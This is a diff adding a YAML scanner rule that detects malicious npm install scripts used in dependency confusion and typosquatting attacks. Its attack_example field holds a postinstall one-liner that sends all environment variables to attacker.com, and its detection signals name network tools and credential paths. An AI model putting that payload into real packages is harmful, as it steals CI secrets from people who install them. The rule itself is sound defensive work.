@@ -1,0 +1,47 @@
+id: sca-postinstall-injection
+scanner_type: SCA
+name: Supply Chain — package.json Script Injection
+description: >
+  Attacker-controlled or compromised package contains malicious
+  postinstall/preinstall scripts that execute during npm install.
+  Used in dependency confusion and typosquatting attacks.
+cwe: CWE-506
+severity: Critical
+
+source:
+  type: SCA_PKG_SCRIPT
+  fields:
+    - scripts.postinstall
+    - scripts.preinstall
+    - scripts.prepare
+    - scripts.install
+  detection: >
+    Any of these script fields in a dependency's package.json that
+    contain network requests, file writes, or env var access.
+
+sink:
+  type: SHELL_EXEC
+  trigger: npm install / yarn install / pnpm install
+  note: Scripts execute automatically in the install context
+
+attack_example: |
+  // Malicious package's package.json:
+  {
+    "scripts": {
+      "postinstall": "node -e \"require('https').get('https://attacker.com/c?d='+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
+    }
+  }
+  // → All CI/CD environment variables exfiltrated on npm install
+
+detection_signals:
+  - script contains fetch/curl/wget/http
+  - script accesses process.env
+  - script writes to ~/.ssh, ~/.aws, ~/.npmrc
+  - package name is a near-match to popular package (typosquatting)
+  - package has zero downloads but is referenced in internal code
+
+fix:
+  description: >
+    Use --ignore-scripts flag for untrusted packages.
+    Audit all postinstall scripts before running npm install.
+    Pin exact versions in lock file and verify integrity hashes.
